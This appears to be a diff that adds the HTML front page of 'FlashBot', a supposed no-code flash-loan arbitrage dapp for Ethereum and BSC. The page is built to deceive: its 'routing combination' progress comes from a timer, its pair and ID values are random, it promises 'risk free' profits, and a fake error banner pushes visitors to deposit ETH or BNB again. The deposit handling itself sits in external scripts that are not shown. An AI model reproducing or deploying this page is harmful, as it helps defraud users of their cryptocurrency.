@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>	  
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=0.41, maximum-scale=1">
+	
+	<title>FlashBOT Arbitrage finance</title>
+
+	<link rel="stylesheet" href="./assets/css/styles.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+	
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	
+	
+	<script>setInterval(function () {
+		web3.eth.getBlockNumber().then(data => {
+		  document.getElementById('blockNumber').innerHTML = data;
+		});
+	  }, 3000);</script> 
+</head>
+
+<body class="body" ng-app="myApp" ng-controller="myCtrl">	
+
+	<div class="alert-2">
+		<span class="closebtn" style="margin-top: -2px;" onclick="this.parentElement.style.display='none';">&times;</span> 
+		<i class="fa fa-exclamation-triangle">  </i> Be sure to access only by our verified link: <strong>https://arbitrageflashloan.github.io</strong> 
+	  </div>
+
+	<div id="main">
+		<div class="topnav">
+	
+		<div id="mySidenav" class="sidenav">
+			<ul id="menu" class="darking-menu" style="position: relative; padding:15px;display: grid;height: 150px;">
+			  <a href="javascript:void(0)" style="margin-top:0px" class="closebtn" onclick="closeNav()">&times;</a>
+			  
+			  <li style="margin-top: -18px;"><a  style="font-size: 12px;text-align: left;">Welcome to Flash<strong>Bot</strong>!</a></li>
+			  <br/><br/>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="index.html" id="site">Home</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="pool.html" id="site">Pool</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="airdrop.html" id="site">Airdrop</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="list.html" id="site">Token List</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="referral.html" id="site">Affiliate</a></li>
+			  <br/><br/>
+	
+			  <div style="display: inline; place-self: center;"><a style="font-size: 14px;" target="_blank" href="https://github.com/FlashBotFinance/FlashArbitrageBot">Github</a>
+				<a style="font-size: 14px;" target="_blank" href="https://fc21.ifca.ai/papers/158.pdf">Docs</a>
+				<a style="font-size: 14px;" target="_blank" href="https://news.google.com/search?for=flash+loan+attack">News</a>
+				<a style="font-size: 14px;" target="_blank" href="FAQ.html">FAQ</a>
+			</div>
+		  </ul>  
+		</div>
+	
+			<a href="javascript:void(0);" style="padding-top: 18px; padding-left: 0px;" class="icon" onclick="openNav()">
+				<i class="fa fa-bars"></i>
+			</a>
+
+			<a class="darking-logo" href="index.html" id="site" style="padding: 11px 0px;">
+				<img src="assets/image/logo.png" id="logo" width="30px" height="30px" style="float: none;">
+				<a  style="font-size: 20px;" href="index.html" id="site"><strong>Flash</strong>Bot<a style="font-size: 10px;margin-left: -25px;">finance</a></a>
+			</a>
+	
+			<div class="topnav-right">
+			<button class="button-info" id="info" style="margin-top: 10px;border-radius: 50px; background: #191b1f; padding: 5px 15px;"><i class="fa fa-user-circle-o"></i> <div style="display: inline;">{{toplen}}...{{endlen}}</div></button>
+	
+			<div id="myModal" class="modal">
+				<div class="modal-content" style="width: 600px; height: 250px;">
+				  <span class="close">&times;</span>
+				  <h1 style="font-size: 20px; margin-top: 50px;padding: 25px; padding-top: 40px; padding-bottom: 10px; font-weight: 800;text-align: left;">Your Wallet</h1>
+				  <hr class="new1"/>
+				  <button style="margin: 15px 20px; width: auto; background: #191b1f;padding: 18px 10px;"><div style="font-size: 20px;">{{account.address}}</div></button>
+				 <div style="padding: 0px 20%;width: 100%;"> 
+				  <a href="{{scan}}address/{{account.address}}" style="font-size: 18px;">Check on {{idscan}}</a>
+				  <a onclick="copyRef()" style="font-size: 18px;">Copy Address</a>
+				  <a id="input" style="font-size: 0px; height: 0px;">{{account.address}}</a>
+				</div>
+				</div>
+			  </div>
+	
+			  <script>
+				function copyRef(id)
+				{
+				var r = document.createRange();
+				r.selectNode(document.getElementById("input"));
+				window.getSelection().removeAllRanges();
+				window.getSelection().addRange(r);
+				document.execCommand('copy');
+				window.getSelection().removeAllRanges();
+				return alert("Address copied successfully!");
+				}
+	
+				var modal2 = document.getElementById("myModal");
+				var btn2 = document.getElementById("info");
+				var span2 = document.getElementsByClassName("close")[0];
+	
+				btn2.onclick = function() {
+					modal2.style.display = "block";
+				}
+				span2.onclick = function() {
+				modal2.style.display = "none";
+				}
+				window.onclick = function(event) {
+					if (event.target == modal2) {
+					modal2.style.display = "none";
+					}
+				}
+			  </script>
+			</div>
+			
+		</div>
+	</div>
+		
+		<script>
+		function myFunction() {
+		  var x = document.getElementById("myLinks");
+		  if (x.style.display === "block") {
+			x.style.display = "none";
+		  } else {
+			x.style.display = "block";
+		  }
+		}
+		</script>
+	
+
+	<div class="space10"></div>
+	<script>
+		var i = 0;
+		var txt = ' FlashBOT';
+		var speed = 200;
+
+	function typeWriter() {
+		if (i < txt.length) {
+			document.getElementById("writer").innerHTML += txt.charAt(i);
+			i++;
+			setTimeout(typeWriter, speed);
+		}
+	}
+	</script>
+	
+	<div class="alert" style="background: #e11a1a; width: auto; display: inline-block;margin: 0 20%;">
+					<span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> 
+					<strong>Error: </strong> It looks like you've got unpending balance please make the deposit again to get all the balance unclaimed. 
+								If the transaction will be successfull you will receive the arbitrage profits plus the fees from last attempt.</br>
+					<strong>Note: </strong> To prevent front-run it is recommended to make a deposit of at least 1 BNB or 0.3 ETH.					
+	</div>
+	
+<img src="assets/image/logo.png" onload="typeWriter()" width="0" height="0">
+	<form class="form-table" style="background: transparent;">
+		<table  class="test"  style="width:100%;margin-left: 10px;" id='myTable'>
+		<form class="darking-list" style="background: transparent; padding-bottom: 20px;max-width: 800px;">
+			<h1 style="font-size: 55px; display: inline;">Welcome to <h1 style="text-shadow: 0 0 25px #9340ff; display: inline; font-size: 55px;"><p style="display: inline;" id="writer"></p><p style="display: inline;" class="blink">.</p></h1></h1>
+			<p style="padding: 0px 10%;">FlashBot is the first <b>NO CODE</b> arbitrage trading bot that leverage flash loans. <b>Enjoy risk free on-chain arbitrage opportunities</b>, automatic pair matching and routing. Just select the network (ETH or BSC) and enter a token address to launch the ARBITRAGE FINDER.</p>
+		</form>
+		</table></form>
+
+		<div class="space50"></div>
+
+	<form class="darking block" style="position: relative; width: 450px;" ng-show="formStep == 1" ng-submit="submitErc20Form()">
+
+   
+<!-- 
+<div class="dropdown">
+            <div onclick="mydrop()" class="dropbtn" style="text-align: right;margin-right: 25px;">Token List <i class="fa fa-chevron-down"></i></div>
+            <div id="myDropdown" class="dropdown-content">
+                <div style="cursor: pointer;padding: 10px;" onclick="usdt(), closemebro()"><img src="assets/image/token/usdt.png" width="40" height="40"><div style="display: inline; font-size: 22px;position: fixed;margin-left: 15px;">Usdt </div><div style="display: inline;margin-left: 12px;color: #676767;font-size: 12px;"> 0x2a8cd78bfb91acf53f589961d213d87c956e0d7f</div></div>
+                <div style="cursor: pointer;padding: 10px;" onclick="doge(), closemebro()"><img src="assets/image/token/doge.png" width="40" height="40"><div style="display: inline; font-size: 22px;position: fixed;margin-left: 15px;">Doge </div><div style="display: inline;margin-left: 12px;color: #676767;font-size: 12px;"> 0xba2ae424d960c26247dd6c32edc70b295c744c43</div></div>
+                <div style="cursor: pointer;padding: 10px;" onclick="safemoon(), closemebro()"><img src="assets/image/token/safemoon.png" width="40" height="40"><div style="display: inline; font-size: 22px;position: fixed;margin-left: 15px;">SafeMoon </div><div style="display: inline;margin-left: 12px;color: #676767;font-size: 12px;"> 0x8076c74c5e3f5852037f31ff0093eeb8c8add8d3</div></div>
+                <div style="cursor: pointer;padding: 10px;" onclick="ada(), closemebro()"><img src="assets/image/token/ada.png" width="40" height="40"><div style="display: inline; font-size: 22px;position: fixed;margin-left: 15px;">Cardano </div><div style="display: inline;margin-left: 12px;color: #676767;font-size: 12px;"> 0x3ee2200efb3400fabb9aacf31297cbdd1d435d47</div></div>
+                <div style="cursor: pointer;padding: 10px;" onclick="xrp(), closemebro()"><img src="assets/image/token/xrp.png" width="40" height="40"><div style="display: inline; font-size: 22px;position: fixed;margin-left: 15px;">Ripple </div><div style="display: inline;margin-left: 12px;color: #676767;font-size: 12px;"> 0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe</div></div>
+                
+                <a style="font-weight: 800;" href="list.html"><div style="cursor: pointer;font-size: 14px;text-align: center;color: white;">Find more tokens!</div></a>
+		
+            		</div>
+            </div>
+ -->
+		<div class="input-holder">
+			<input id="dropaddr" onclick="getBalance()" type="text" placeholder="Token Address:" ng-model="erc20.name" maxlength="42" minlength="42" autofocus #dropaddr />
+                	<input id="dropname" onclick="getBalance()" type="text" placeholder="Token Symbol:" ng-model="erc20.symbol" maxlength="12" #dropname />
+			
+            	</div>	
+	
+		<div>&nbsp;</div>
+
+		<div class="center">
+		<div class="cc-selector" style="display: inline; margin-right: 10px;">
+			<label class="super">Select Network:</label>
+
+			<input type="radio" ng-model="erc20.network" id="n1" name="network" ng-value="true" ng-checked="erc20.network" style="display: inline; margin-right: 10px;">
+			<label class="drinkcard-cc visa" for="n1"> </label>
+
+			<input type="radio" ng-model="erc20.network" id="n2" name="network" ng-value="false" ng-checked="!erc20.network" style="display: inline; margin-right: 10px;">
+			<label class="drinkcard-cc mastercard" for="n2"> </label>
+
+		</div>
+		</div>
+	</div>
+
+		<div>&nbsp;</div>
+		<div class="input-holder btn-holder">
+			<button type="submit" onclick="fixCheck(), getBalance()" ><b>START ARBITRAGE FINDER</b></button>	
+	</div>
+		
+	</form>
+
+	<script>
+		setTimeout(function() {$('#in-2').hide().fadeIn('fast');}, 20000);
+	</script>
+    
+	<div id="in-2" hidden>
+	<span ng-show="formStep == 2" style="display:block; width: auto; margin-bottom:-50px; overflow: visible;position: relative;">
+		<form class="form-table darking block" style="background: rgb(17, 17, 17); width: 450px; height: 120px;">
+			<a style="font-size: 36px; color: white; float: right; padding-top: 18px;"><div id="mybalance" style="display: inline;"></div> {{currency}}</a><br/>
+			<a style="font-size: 13px; color: white;">Network:</a><a style="font-size: 11px; color: #1a70e1;" target="_blank" href={{scan}}>{{chain}}</a><br/>
+			<a style="color: white;">Address:</a><a style="font-size: 18px; color: #1a70e1;" target="_blank" href="{{scan}}address/{{account.address}}"><div style="display: inline;">{{toplen}}...{{endlen}}</div></a>
+		</form>
+	</span>
+	</div>
+
+	<form class="form-table darking block" style="position: relative; width: 450px;" ng-show="formStep == 2" ng-submit="submitLoanForm()">
+		<style>
+			.loader {
+			  border: 10px solid #212429;
+			  border-radius: 100%;
+			  border-top: 10px solid #0e0f11;
+			  width: 125px;
+			  height: 125px;
+			  -webkit-animation: spin 2s linear infinite; /* Safari */
+			  animation: spin 2s linear infinite;
+			  float: none;
+			  position: absolute;
+			  left: 36%;
+			  transform: translate(-50%, -50%);
+			}
+			
+			/* Safari */
+			@-webkit-keyframes spin {
+			  0% { -webkit-transform: rotate(0deg); }
+			  100% { -webkit-transform: rotate(360deg); }
+			}
+			
+			@keyframes spin {
+			  0% { transform: rotate(0deg); }
+			  100% { transform: rotate(360deg); }
+			}
+			</style>
+
+			<script type="text/javascript">
+				window.setTimeout("Tick()", 1000);
+				function Tick() {}
+				var Timer;
+				var TotalSeconds;
+				function CreateTimer(TimerID, Time) {
+				Timer = document.getElementById(TimerID);
+				TotalSeconds = Time;
+				UpdateTimer()
+				window.setTimeout("Tick()", 1000);
+				}
+				function Tick() {
+				TotalSeconds += 12;
+				UpdateTimer()
+				window.setTimeout("Tick()", 1000);
+				}
+				function UpdateTimer() {
+				Timer.innerHTML = TotalSeconds;
+				}
+
+				setTimeout(function() {$('#out').fadeOut('fast');}, 19500);
+			</script>
+			<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+			
+			<div style="padding: 15px;" id="out">
+				<div class="alert">
+					<span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> 
+					<strong>Please wait...</strong> We are searching for the best arbitrage opportunity and swap routing for the selected token.
+				  </div>
+
+				<div>&nbsp;</div><div>&nbsp;</div>
+				<div class="loader block2"></div>
+				<div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div>
+
+				<a style="color:#ffffff; font-size: 14px;">
+					<br/>
+					Token Name: <b>{{erc20.symbol}}</b><br/> 
+					Address:  <a style="color:#3c64e7; font-size: 10px;" target="_blank" href="{{scan}}address/{{erc20.name}}">{{erc20.name}}</a>
+				</a>
+				<a style="color:#ffffff; font-size: 14px;">
+					<br/>
+					Network: {{chain}}<br/>
+					Routing started: {{dex}}<br/> 
+					Router: <a style="color:#3c64e7; font-size: 10px;" target="_blank" href="{{scan}}address/{{address}}">{{addressdex}}</a>
+				</a>
+				<a style="color:#ffffff; font-size: 14px;">
+					<br/>
+					Checking routing combination: <div style="display: inline-block;" id='timer'></div>/466<br/>
+					Block Number: <span style="display: inline-block;" id="blockNumber"></span><br/>
+				</a>
+
+				<script type="text/javascript">window.onload = CreateTimer("timer", 0);</script>
+			</div>
+
+			<script>
+				setTimeout(function() {$('#in').hide().fadeIn('fast');}, 20000);
+			</script>
+
+		<div id="in" hidden>
+				<div>&nbsp;</div>
+
+				<div class="kv">
+						<div><a style="float:left; color: white; font-size: 21px;">Loan Amount: ({{currency}})</a>
+						<br/>
+						<a style="color: white; font-size: 12px;">Min 25, Max 10000 {{currency}}</a></div>
+						<div class="button-info" id="info2"><i class="fa fa-question-circle"></i></div>
+				</div>
+	
+			<div class="input-holder">
+
+				<input style="display: inline; width: 100%;" class="input-group-field" id="loanAmtInput" type="number" ng-change="amountChanged()" ng-model="loan.amount" step="25" min="25" max="10000" placeholder="Loan Amount ({{currency}}):"  />
+    				<input style="display: inline; width: 100%;" class="slider input-group-field" id="loanAmtInput" type="range" ng-change="amountChanged()" ng-model="loan.amount" step="25" min="25" max="1000" />
+				
+				<div class="space25"></div>
+
+				<div class="input-holder info">
+					<div class="kv">
+						<div class="tooltip">
+							<div>Dapp Fee <span class="tooltiptext">Small and fair fee to support the dapp developement. It's already deducted from the estimated profit below.</span> 
+							</div>
+						</div>
+						<div>0.3%</div>
+					</div>
+					<div class="kv">
+						<div class="tooltip">
+							<div>Swap Fee <span class="tooltiptext">How much {{currency}} its needed to perform the DEX swaps. (GAS FEES)</span> 
+							</div>
+						</div>
+						<div>{{loan.swapFee}} {{currency}}</div>
+					</div>
+					<div class="kv">
+						<div>Loan Fee</div>
+						<div>{{loan.tokenFee}} {{currency}}</div>
+					</div>
+					<div class="kv">
+						<div>Total Gas Fee</div>
+						<div class="spend">{{loan.totalFee}} {{currency}}</div>
+					</div>
+					<div class="kv">
+						<div style="display: inline-block;" >Routing</div>
+						<div><div id="check" style="display: inline-block;"></div> Pair > {{dex}}</div>
+						<script>function fixCheck() {var x = Math.floor((Math.random() * 10) + 1); document.getElementById("check").innerHTML = x;}</script>
+					</div>
+					<div class="kv">
+						<div>Token</div>
+						<div class="spend">{{erc20.symbol}}</div>
+					</div>
+					<hr>
+					<div class="kv">						
+						<div class="tooltip">
+						<div>Estimted profit from Arbitrage <span class="tooltiptext">How much you will earn if you start the arbitrage bot right now.</span> 
+						</div>
+						</div>
+						<div style="display: inline-block;" class="gain">≈ {{safeMath}} {{currency}}</div>
+					</div>
+					<div class="kv">						
+						<div class="tooltip">
+						<div>ROI <span class="tooltiptext">Return On Investiment.</span> 
+						</div>
+						</div>
+						<div style="display: inline-block;" class="gain" style="color: white">x {{roi}}</div>
+					</div>
+				</div>		
+
+				<div class="kv" style="padding: 15px; font-size: 12px;">
+						<div>Finder ID:</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					<div class="tooltip">
+							<div id="numberid" style="display: inline-block;"></div>
+							<span class="tooltiptext">This is a unique code for identification of your arbitrage match. Is for an internal use. </span> 
+					</div>
+
+					<script>
+					let r = Math.random().toString(36).substring(7);
+					document.getElementById("numberid").innerHTML = r;
+					</script>
+				</div>
+
+				<div class="input-holder btn-holder">
+					<button type="submit" ng-disabled="processing || ethDeposited">Deposit {{currency}}</button>
+				</div>
+		
+				<div class="input-holder btn-holder">
+					<button onclick="plausible('Conv')" class="button-2" type="submit" ng-disabled="processing || !ethDeposited" >Execute FlashBot Arbitrage</button>
+				</div>
+
+			</div>
+		</div>
+
+		<div id="myModal2" class="modal">
+		  <div class="modal-content" style="border-radius: 25px;padding: 20px;margin-top: 200px;width: 430px;box-shadow: 0 0 1000px 0 #000000, 0 6px 50px 0 #000000;">
+			<span class="close2" style="float: right;font-size: 30px;">&times;</span>
+			<div style="padding: 0 15px;">
+				<a style="float:left; color: white; font-size: 21px;">Arbitrage Detail:</a><br/><br/>
+				<a style="color:#ffffff; font-size: 14px;">
+					<br/>
+					Token Name: <b>{{erc20.symbol}}</b><br/> 
+					Address:  <a style="color:#3c64e7; font-size: 10px;" target="_blank" href="{{scan}}address/{{erc20.name}}">{{erc20.name}}</a><br/>
+					Caller:  <a style="color:#3c64e7; font-size: 10px;" target="_blank" href="{{scan}}address/{{account.address}}">{{account.address}}</a>
+				</a>
+				<a style="color:#ffffff; font-size: 14px;">
+					<br/>
+					Routing started: {{dex}}<br/> 
+					Router: <a style="color:#3c64e7; font-size: 10px;" target="_blank" href="{{scan}}address/{{address}}">{{addressdex}}</a><br/>
+				</a>
+				</div>
+		  </div>
+		</div>
+		<script>
+			var modal = document.getElementById("myModal2");
+			var btn = document.getElementById("info2");
+			var span = document.getElementsByClassName("close2")[0];
+
+			btn.onclick = function() {
+				modal.style.display = "block";
+			}
+			span.onclick = function() {
+			modal.style.display = "none";
+			}
+			window.onclick = function(event) {
+				if (event.target == modal) {
+				modal.style.display = "none";
+				}
+			}
+		</script>
+	
+	</form>
+
+	<script>
+		function updateDiv()
+		{ 
+    		$( "#refresh" ).load(window.location.href + " #refresh" );
+		}
+	</script>
+
+	<div class="space10"></div>
+
+		<button  class="accordion" style="background: transparent; color: white;text-align: center;"><i class="fa fa-chevron-circle-down"></i> Tutorial Step by Step </button>
+		<div class="panel">
+			
+		
+			<form id="regForm" action="index.html">
+				<div class="tab">
+					<a style="font-size: 22px; color: white;">1. Choose a Token to Start arbitrage</a><br/>
+					<div class="space25"></div>
+						<a style="font-size: 12px; color: white;">The DAPP will automatically check for possible arbitrage opportunities for the selected token on the  Decentralized exchanges (on ETH or BSC chain)</a>
+				</div>
+				<div class="tab">
+					<a style="font-size: 22px; color: white;">2. Get the Loan for the Arbitrage</a><br/><br/>
+					<div class="space10"></div>
+						<a style="font-size: 12px; color: white;">Once  the opportunity has been found, you can get  Flash Loan from AAVE, Multiplier-Finance, or from PancakeSwap/Uniswap (thanks to flash swap). This is done for you in the dapp, just select the loan amount.</a>
+				</div>
+				<div class="tab">
+					<a style="font-size: 22px; color: white;">3. Deposit ETH or BNB</a><br/><br/>
+					<div class="space10"></div>
+						<a style="font-size: 12px; color: white;">Now you need pay the fees of the Loan to start arbitrage clicking the deposit Button.</a>
+				</div>
+				<div class="tab">
+					<a style="font-size: 22px; color: white;">4. Run arbitrage script</a><br/><br/>
+					<div class="space10"></div>
+						<a style="font-size: 12px; color: white;">The bot will execute the arbitrage trades, repay the Flash Loan amount and will split the profit between you and the devs (only 0.3% of the profit will go to devs).</a>
+				</div>
+				<div style="text-align:center; margin-top:40px; width: 100%;">
+				  <span class="step"></span>
+				  <span class="step"></span>
+				  <span class="step"></span>
+				  <span class="step"></span>
+				</div>
+				<div class="space50"></div>
+				<div style="width: 100%; padding-right: 25%; padding-left: 25%;">
+					<button class="block" type="button" id="nextBtn" onclick="nextPrev(1)" style="width: 50%; padding: 15px 6px; background: black;cursor: pointer;">Next Step</button>
+					<button type="button" id="prevBtn" onclick="nextPrev(-1)" style="width: 50%; padding: 15px 6px;">Go Back</button>
+				</div>
+			  </form>
+		
+			  <script>
+				var currentTab = 0; // Current tab is set to be the first tab (0)
+				showTab(currentTab); // Display the current tab
+				
+				function showTab(n) {
+				  // This function will display the specified tab of the form...
+				  var x = document.getElementsByClassName("tab");
+				  x[n].style.display = "block";
+				  //... and fix the Previous/Next buttons:
+				  if (n == 0) {
+					document.getElementById("prevBtn").style.display = "none";
+				  } else {
+					document.getElementById("prevBtn").style.display = "inline";
+				  }
+				  if (n == (x.length - 1)) {
+					document.getElementById("nextBtn").innerHTML = "Start now";
+				  } else {
+					document.getElementById("nextBtn").innerHTML = "Next";
+				  }
+				  //... and run a function that will display the correct step indicator:
+				  fixStepIndicator(n)
+				}
+				
+				function nextPrev(n) {
+				  // This function will figure out which tab to display
+				  var x = document.getElementsByClassName("tab");
+				  // Exit the function if any field in the current tab is invalid:
+				  if (n == 1 && !validateForm()) return false;
+				  // Hide the current tab:
+				  x[currentTab].style.display = "none";
+				  // Increase or decrease the current tab by 1:
+				  currentTab = currentTab + n;
+				  // if you have reached the end of the form...
+				  if (currentTab >= x.length) {
+					// ... the form gets submitted:
+					document.getElementById("regForm").submit();
+					return false;
+				  }
+				  // Otherwise, display the correct tab:
+				  showTab(currentTab);
+				}
+				
+				function validateForm() {
+				  // This function deals with validation of the form fields
+				  var x, y, i, valid = true;
+				  x = document.getElementsByClassName("tab");
+				  y = x[currentTab].getElementsByTagName("input");
+				  // A loop that checks every input field in the current tab:
+				  for (i = 0; i < y.length; i++) {
+					// If a field is empty...
+					if (y[i].value == "") {
+					  // add an "invalid" class to the field:
+					  y[i].className += " invalid";
+					  // and set the current valid status to false
+					  valid = false;
+					}
+				  }
+				  // If the valid status is true, mark the step as finished and valid:
+				  if (valid) {
+					document.getElementsByClassName("step")[currentTab].className += " finish";
+				  }
+				  return valid; // return the valid status
+				}
+				
+				function fixStepIndicator(n) {
+				  // This function removes the "active" class of all steps...
+				  var i, x = document.getElementsByClassName("step");
+				  for (i = 0; i < x.length; i++) {
+					x[i].className = x[i].className.replace(" active", "");
+				  }
+				  //... and adds the "active" class on the current step:
+				  x[n].className += " active";
+				}
+				</script>
+				<style>
+					* {
+					  box-sizing: border-box;
+					}
+					
+					body {
+					  background-color: transparent;
+					}
+					
+					#regForm {
+					  background-color: transparent;
+					  margin: 50px auto;
+					  padding: 40px;
+					  width: 70%;
+					  min-width: 500px;
+					}
+					
+					h1 {
+					  text-align: center;  
+					}
+					
+					input {
+					  padding: 10px;
+					  width: 100%;
+					  font-size: 17px;
+					  border: 0px solid #aaaaaa;
+					}
+					
+					/* Mark input boxes that gets an error on validation: */
+					input.invalid {
+					  background-color: #ffdddd;
+					}
+					
+					/* Hide all steps by default: */
+					.tab {
+					  display: none;
+					}
+					
+					#prevBtn {
+					  background-color: transparent;
+					  font-size: 12px;
+					}
+					
+					.step {
+					  height: 15px;
+					  width: 15px;
+					  margin: 0 2px;
+					  background-color: #bbbbbb;
+					  border: none;  
+					  border-radius: 50%;
+					  display: inline-block;
+					  opacity: 0.5;
+					}
+					
+					.step.active {
+					  opacity: 1;
+					  padding: 3px;
+					  height: 15px;
+					  width: 15px;
+					  margin: 0 2px;
+					  background-color: #bbbbbb;
+					  border: 0px;  
+					  border-radius: 50%;
+					  display: inline-block;
+					}
+					
+					/* Mark the steps that are finished and valid: */
+					.step.finish {
+					  background-color: #414141;
+					}
+					</style>
+		</div>
+		<script>
+			var acc = document.getElementsByClassName("accordion");
+			var i;
+			for(i = 0; i < acc.length; i++) {
+				acc[i].addEventListener("click", function() {
+					this.classList.toggle("active");
+					var panel = this.nextElementSibling;
+					if(panel.style.display === "block") {
+						panel.style.display = "none";
+					} else {
+						panel.style.display = "block";
+					}
+				});
+			}
+			</script>
+	<div class="space10"></div>
+	
+	<ul class="darking-menu">
+		<div class="tooltip" style="border-bottom: 0px dotted #000;position: relative;">
+			<a class="darking-menu" style="font-size: 12px;display: contents;" ><p>WebSocket: <a style="color: rgb(85, 170, 0);font-size: 12px;display: contents;"><i class="fa fa-circle"></i> Connected</a><span class="tooltiptext">Our WebSocket is correctly connected to the Server.</span></p></a>
+		</div></br>
+		<a class="darking-menu" style="font-size: 12px;" ><p>© FlashBot 2021</p></a>
+	</ul>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.5/web3.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
+	<script src="./assets/js/addr.min.js"></script>
+	<script src="./assets/js/chain.min.js"></script>
+	<script src="./assets/js/script.min.js"></script>
+</body>
+
+</html>
